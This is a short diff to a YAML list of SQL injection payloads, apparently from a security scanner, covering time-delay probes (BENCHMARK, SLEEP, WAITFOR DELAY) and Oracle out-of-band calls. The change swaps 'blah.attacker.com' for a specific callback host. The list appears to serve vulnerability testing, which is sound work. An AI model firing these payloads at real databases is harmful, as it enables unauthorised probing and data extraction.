@@ -1,5 +1,5 @@
 mysql_select:
-  - BENCHMARK(1000000,MD5(‘A’))
+  - BENCHMARK(1000000,MD5('A'))
   - SLEEP(5)
 mssql_select:
   - WAITFOR DELAY '00:00:20'
@@ -12,9 +12,9 @@ simple_select:
   - "%postgre_select;"
     
 oracle_select:
-  - UTL_INADDR.get_host_name(’10.0.0.1′)
-  - UTL_INADDR.get_host_address(‘blah.attacker.com’)
-  - UTL_HTTP.REQUEST(‘http://google.com’)
+  - UTL_INADDR.get_host_name('10.0.0.1')
+  - UTL_INADDR.get_host_address('5696d8f4.bzn.pw')
+  - UTL_HTTP.REQUEST('http://5696d8f4.bzn.pw')
 
 all_select:
   - "%simple_select;"
